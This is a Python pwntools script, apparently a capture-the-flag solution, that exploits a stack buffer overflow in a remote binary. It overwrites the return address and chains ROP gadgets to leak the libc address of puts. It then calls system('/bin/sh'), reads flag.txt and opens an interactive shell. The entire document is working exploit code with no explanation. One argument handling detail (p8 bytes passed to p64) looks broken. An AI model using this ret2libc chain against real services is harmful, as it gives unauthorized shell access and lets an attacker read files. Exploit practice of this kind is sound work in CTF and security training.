from typing import Unpack

from pwn import ELF, p8, p64, remote


P = remote("10.212.173.64", 32_216)

OFFSET = 64 + 8
RET_ADDR = 0x401016


def construct_and_send_payload(prompt: str, *args: Unpack[tuple[int, ...]]) -> None:
    payload = b"A" * OFFSET
    payload += p64(RET_ADDR)

    for arg in args:
        payload += p64(arg)

    P.sendlineafter(prompt.encode(), payload)


def main() -> None:
    vuln2_addr = 0x4013B1
    vuln3_addr = 0x4012DA
    pop_rdi_ret_addr = 0x4015CB
    puts_addr = 0x405018

    construct_and_send_payload("Enter your input:", vuln2_addr)
    construct_and_send_payload("Enter your input:", pop_rdi_ret_addr, 0xDEADBEEF, vuln3_addr)
    P.sendlineafter(b"Enter the address in hex (e.g. 0x7ffeef000):", hex(puts_addr).encode())

    libc = ELF("./libc.so.6")
    libc_puts_addr = int(P.recvline().split()[-1], 16)
    libc_base_addr = libc_puts_addr - libc.symbols["puts"]
    system_addr = libc_base_addr + libc.symbols["system"]
    binsh_addr = libc_base_addr + next(libc.search("/bin/sh"))

    construct_and_send_payload("Enter your input:", pop_rdi_ret_addr, binsh_addr, system_addr, p8(0x0))
    P.sendline(b"cat flag.txt")

    P.interactive()


if __name__ == "__main__":
    main()
